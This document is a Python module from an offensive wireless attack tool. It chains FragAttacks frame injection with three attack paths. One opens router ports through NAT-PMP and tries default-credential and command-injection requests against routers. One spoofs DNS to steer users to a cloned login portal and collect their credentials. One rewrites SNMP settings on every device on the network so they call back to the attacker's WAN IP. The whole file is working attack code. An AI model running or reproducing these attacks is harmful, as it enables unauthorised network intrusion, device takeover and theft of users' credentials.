"""
paths.py — The three attack chains

All attacks are UDP-first. TCP injection is unreliable without a handshake;
UDP datagrams are processed immediately on arrival.

Path 1: FragAttacks → NAT-PMP + SNMP router attack
  NAT-PMP (UDP 5351): single datagram opens a WAN port — no TCP handshake.
  SNMP (UDP 161): probe router with write communities, redirect syslog/traps.

Path 2: FragAttacks → DNS injection → Cloned portal → Credential harvest
  DNS responses are UDP — race the real server, redirect clients to our clone.

Path 3: FragAttacks → SNMP device pivot
  Inject SNMP SET to every client on the network.
  Redirect syslog server / trap destination to our WAN IP.
  Device initiates outbound UDP callback — we receive it through the router NAT.
  Works on any SNMP-enabled device: routers, printers, cameras, switches, NAS.
"""

import time, threading, socket, struct
from typing import Optional

try:
    from scapy.all import sniff, IP, UDP, DNS, Dot11, Raw, conf
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    raise SystemExit("Install deps: pip install scapy requests")

from . import tui, injector

conf.verb = 0

EXT_PORT = 62222   # WAN port to open via NAT-PMP
INT_PORT = 22      # internal port to forward to (SSH)

# ── network helpers ───────────────────────────────────────────────────────────

def _gateway_candidates() -> list[str]:
    return [
        "192.168.1.1", "192.168.0.1", "192.168.1.254", "192.168.0.254",
        "10.0.0.1", "10.0.0.138", "10.1.1.1", "172.16.0.1",
        "192.168.2.1", "192.168.10.1", "192.168.100.1",
    ]

def _client_ip_for_gateway(gw: str) -> str:
    parts = gw.split('.'); parts[-1] = '150'
    return '.'.join(parts)

def _subnet_hosts(gw: str, count: int = 20) -> list[str]:
    """Return a spread of likely host IPs on the same /24 as gw."""
    prefix = '.'.join(gw.split('.')[:3])
    common = [1, 2, 100, 101, 102, 103, 104, 105, 110, 150,
              200, 201, 202, 203, 210, 220, 230, 240, 250, 254]
    return [f"{prefix}.{h}" for h in common[:count]]

def _get_wan_ip() -> str:
    for url in ["https://api.ipify.org", "https://ifconfig.me/ip",
                "https://icanhazip.com"]:
        try:
            r = requests.get(url, timeout=5)
            ip = r.text.strip()
            if ip: return ip
        except Exception:
            continue
    return "UNKNOWN"

def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def _probe_port(host: str, port: int, timeout: int = 3) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close(); return True
    except Exception:
        return False

# ── UDP listener for inbound callbacks ───────────────────────────────────────

class CallbackListener:
    """
    Listen on UDP ports for callbacks from target devices.
    When we SET a device's syslog/trap server to our WAN IP,
    the device sends outbound UDP — this catches it.
    """
    PORTS = [162, 514, 123, 6343]  # SNMP trap, syslog, NTP, sFlow

    def __init__(self):
        self.received = []
        self._stop    = threading.Event()
        self._sockets = []

    def start(self):
        for port in self.PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(1.0)
                s.bind(('0.0.0.0', port))
                self._sockets.append((port, s))
            except Exception:
                pass
        t = threading.Thread(target=self._run, daemon=True)
        t.start()

    def _run(self):
        while not self._stop.is_set():
            for port, s in self._sockets:
                try:
                    data, addr = s.recvfrom(4096)
                    self.received.append({'port': port, 'from': addr[0],
                                          'data': data.hex()})
                except socket.timeout:
                    continue
                except Exception:
                    continue

    def stop(self):
        self._stop.set()
        for _, s in self._sockets:
            try: s.close()
            except Exception: pass

    def got_callback(self) -> bool:
        return len(self.received) > 0

# ── Path 1: NAT-PMP + SNMP router attack ─────────────────────────────────────

def path1_router_admin(iface: str, network, verbose: bool = False) -> bool:
    tui.phase("PATH 1 — NAT-PMP + SNMP Router Attack")

    ap_mac       = network.bssid
    spoof_client = network.clients[0] if network.clients else "00:11:22:33:44:55"
    gateways     = _gateway_candidates()
    our_wan_ip   = _get_wan_ip()
    tui.info(f"WAN IP: {our_wan_ip}")
    tui.info(f"Patch estimate: {injector.estimate_patch_status(network.vendor, network.ssid)}")

    # ── Step 1: NAT-PMP port mapping (UDP 5351) ────────────────────────────
    tui.info(f"Injecting NAT-PMP requests (ext:{EXT_PORT} → int:{INT_PORT})…")
    for gw in gateways:
        client_ip = _client_ip_for_gateway(gw)
        for proto in ['TCP', 'UDP']:
            # External IP query first
            qpkt = injector.craft_natpmp_request(
                client_ip, gw, INT_PORT, EXT_PORT, proto=proto)
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, qpkt)
            injector.inject(iface, frame, count=3, inter=0.05)
            if verbose:
                tui.info(f"  → NAT-PMP {proto} {gw}:{EXT_PORT}")
        time.sleep(0.02)

    # Check if NAT-PMP opened the port
    time.sleep(2)
    if _probe_port(our_wan_ip, EXT_PORT):
        tui.success(f"NAT-PMP succeeded — port {EXT_PORT} open on {our_wan_ip}")
        tui.success(f"SSH: ssh -p {EXT_PORT} user@{our_wan_ip}")
        return True

    tui.info("NAT-PMP probe negative — trying SNMP…")

    # ── Step 2: SNMP probe + write attack on router ────────────────────────
    tui.info("Injecting SNMP GET probes (public community)…")
    success = False

    for gw in gateways[:6]:
        client_ip = _client_ip_for_gateway(gw)

        # Read probe — confirm SNMP is enabled
        for community in injector.SNMP_READ_COMMUNITIES:
            pkt = injector.craft_snmp_get(client_ip, gw, community,
                                          injector.OID_SYS_DESCR)
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
            injector.inject(iface, frame, count=2, inter=0.03)
            if verbose:
                tui.info(f"  → SNMP GET {gw} community={community}")

        # Write attack — try all write communities
        tui.info(f"Injecting SNMP SET to {gw}…") if verbose else None
        for community in injector.SNMP_WRITE_COMMUNITIES:
            # Write our WAN IP as syslog/trap server
            # This triggers the router to send outbound UDP to us
            for oid in injector.SYSLOG_OIDS + injector.TRAP_DEST_OIDS:
                pkt = injector.craft_snmp_set_ip(
                    client_ip, gw, community, oid, our_wan_ip)
                frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
                injector.inject(iface, frame, count=2, inter=0.02)

            # Also write sysLocation to confirm write access
            pkt = injector.craft_snmp_set_string(
                client_ip, gw, community,
                injector.OID_SYS_LOCATION, "fracture_probe")
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
            injector.inject(iface, frame, count=1)

        time.sleep(0.05)

    # ── Step 3: HTTP fallback (TCP — limited, kept as last resort) ─────────
    tui.info("TCP HTTP fallback (limited without handshake)…")
    import base64
    CREDS = [("admin","admin"),("admin",""),("admin","password"),
             ("root","root"),("admin","1234"),("user","user"),("root","")]
    UNAUTH = [
        ("POST", "/cgi-bin/luci/;stok=/locale",
         "form_name=login&username=admin&psd=admin"),
        ("GET",  "/setup.cgi?next_file=netgear.cfg&todo=syscmd"
                 "&cmd=id&curpath=/&currentsetting.htm=1", ""),
        ("GET",  "/debuginfo.htm", ""),
    ]
    for gw in gateways[:3]:
        client_ip = _client_ip_for_gateway(gw)
        for user, pwd in CREDS:
            creds_b64 = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            pkt = injector.craft_http_request(
                client_ip, gw, 80, "GET", "/",
                headers={"Authorization": f"Basic {creds_b64}"})
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
            injector.inject(iface, frame, count=1)
            time.sleep(0.01)
        for method, path, body in UNAUTH:
            pkt = injector.craft_http_request(client_ip, gw, 80, method, path, body=body)
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
            injector.inject(iface, frame, count=2)

    tui.info(f"Path 1 complete. Re-probing {our_wan_ip}:{EXT_PORT}…")
    time.sleep(3)
    if _probe_port(our_wan_ip, EXT_PORT):
        tui.success(f"Port {EXT_PORT} open — SSH: ssh -p {EXT_PORT} user@{our_wan_ip}")
        return True

    tui.warn("Path 1 inconclusive — NAT-PMP may not be supported, "
             "SNMP write confirmation requires callback listener.")
    return False

# ── Path 2: DNS injection → cloned portal ────────────────────────────────────

_captured_creds = []
_cred_event     = threading.Event()

def _on_cred(fields: dict):
    _captured_creds.append(fields)
    _cred_event.set()

def path2_portal(iface: str, network, portal_url: str,
                 timeout: int = 120, verbose: bool = False) -> Optional[dict]:
    tui.phase("PATH 2 — DNS Injection → Portal Harvest")

    from . import portal as portal_mod
    cloned = portal_mod.clone_portal(portal_url)
    if not cloned:
        tui.error("Portal clone failed — aborting Path 2")
        return None

    our_ip = _get_local_ip()
    tui.info(f"Serving cloned portal on {our_ip}:80")
    threading.Thread(target=portal_mod.serve_portal,
                     args=(_on_cred,), kwargs={"port": 80},
                     daemon=True).start()
    time.sleep(1)

    portal_domain = portal_url.split("/")[2]
    spoof_targets = [portal_domain, "www." + portal_domain]
    stop_flag     = threading.Event()
    ap_mac        = network.bssid

    def dns_intercept(pkt):
        if stop_flag.is_set() or not pkt.haslayer(DNS): return
        dns = pkt[DNS]
        if dns.qr != 0: return
        try: qname = dns.qd.qname.decode().rstrip('.')
        except Exception: return
        if not any(t in qname for t in spoof_targets): return
        if verbose: tui.info(f"  → DNS query {qname} — injecting spoof")
        cm = (pkt[Dot11].addr2 if pkt.haslayer(Dot11)
              else (network.clients[0] if network.clients else "ff:ff:ff:ff:ff:ff"))
        si = pkt[IP].dst if pkt.haslayer(IP) else "8.8.8.8"
        di = pkt[IP].src if pkt.haslayer(IP) else "192.168.1.150"
        spoof = injector.craft_dns_spoof(si, di, dns.id, qname, our_ip)
        injector.inject(iface, injector.craft_amsdu_inject(ap_mac, cm, spoof),
                        count=5, inter=0.01)

    threading.Thread(target=sniff,
                     kwargs={"iface": iface, "prn": dns_intercept,
                             "filter": "udp port 53", "store": False},
                     daemon=True).start()

    # Proactive spoofs for all associated clients
    for cm in network.clients:
        spoof = injector.craft_dns_spoof("8.8.8.8", "192.168.1.100",
                                          0xBEEF, portal_domain, our_ip)
        injector.inject(iface, injector.craft_amsdu_inject(ap_mac, cm, spoof),
                        count=3, inter=0.05)

    tui.info(f"Waiting up to {timeout}s for credential submission…")
    got = _cred_event.wait(timeout=timeout)
    stop_flag.set()

    if got and _captured_creds:
        creds = _captured_creds[-1]
        tui.success(f"Credentials: {creds}")
        return creds

    tui.warn("Path 2 timed out.")
    return None

# ── Path 3: SNMP device pivot ─────────────────────────────────────────────────

def path3_upnp(iface: str, network, verbose: bool = False) -> bool:
    """
    SNMP pivot across all devices on the network.
    Injects SNMP SET to every discovered client, redirecting syslog/trap
    destinations to our WAN IP. Any device that accepts the SET will
    send outbound UDP callbacks — received through the router's NAT.
    Works generically on any SNMP-enabled device regardless of type.
    """
    tui.phase("PATH 3 — SNMP Device Pivot")

    ap_mac     = network.bssid
    our_wan_ip = _get_wan_ip()
    gateways   = _gateway_candidates()
    tui.info(f"WAN IP (callback target): {our_wan_ip}")

    # Build target list: known clients + subnet sweep + gateways
    targets = list(network.clients)
    for gw in gateways[:4]:
        targets += _subnet_hosts(gw, count=15)
    targets = list(dict.fromkeys(targets))   # deduplicate, preserve order

    tui.info(f"Targeting {len(targets)} hosts with SNMP probes…")

    # Start callback listener before injecting
    listener = CallbackListener()
    listener.start()
    tui.info(f"Callback listener active on UDP {CallbackListener.PORTS}")

    # Spoof MAC: use known client if available, else generic
    spoof_client = network.clients[0] if network.clients else "00:11:22:33:44:55"

    injected = 0
    for target_ip in targets:
        # Use same subnet client IP as source
        gw_guess   = target_ip.rsplit('.', 1)[0] + '.1'
        client_ip  = _client_ip_for_gateway(gw_guess)

        for community in injector.SNMP_WRITE_COMMUNITIES:
            # ── Redirect syslog to us (triggers outbound UDP 514) ──────────
            for oid in injector.SYSLOG_OIDS:
                pkt = injector.craft_snmp_set_ip(
                    client_ip, target_ip, community, oid, our_wan_ip)
                frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
                injector.inject(iface, frame, count=1, inter=0.01)

            # ── Redirect SNMP trap to us (triggers outbound UDP 162) ───────
            for oid in injector.TRAP_DEST_OIDS:
                pkt = injector.craft_snmp_set_ip(
                    client_ip, target_ip, community, oid, our_wan_ip)
                frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
                injector.inject(iface, frame, count=1, inter=0.01)

            # ── Write sysLocation probe (confirms write access if accepted) ─
            pkt = injector.craft_snmp_set_string(
                client_ip, target_ip, community,
                injector.OID_SYS_LOCATION, "fracture")
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
            injector.inject(iface, frame, count=1)

            injected += 1

        if verbose:
            tui.info(f"  → SNMP {target_ip} ({len(injector.SNMP_WRITE_COMMUNITIES)} communities)")

        # Also inject NAT-PMP for every likely gateway
        for gw in gateways[:5]:
            pkt = injector.craft_natpmp_request(
                client_ip, gw, INT_PORT, EXT_PORT)
            frame = injector.craft_amsdu_inject(ap_mac, spoof_client, pkt)
            injector.inject(iface, frame, count=2, inter=0.03)

    tui.info(f"Injected {injected} SNMP SET bursts. Waiting 10s for callbacks…")
    time.sleep(10)

    # ── Check for callbacks ────────────────────────────────────────────────
    if listener.got_callback():
        for cb in listener.received:
            tui.success(f"Callback from {cb['from']} on UDP {cb['port']}")
        listener.stop()
        return True

    listener.stop()

    # ── Final NAT-PMP check ────────────────────────────────────────────────
    tui.info(f"Checking {our_wan_ip}:{EXT_PORT} for NAT-PMP result…")
    if _probe_port(our_wan_ip, EXT_PORT):
        tui.success(f"Port {EXT_PORT} open on WAN — "
                    f"SSH: ssh -p {EXT_PORT} user@{our_wan_ip}")
        return True

    tui.warn("Path 3 inconclusive — no callbacks received, port closed. "
             "Possible reasons: SNMP disabled, wrong communities, "
             "devices fully patched, or NAT-PMP not supported.")
    return False
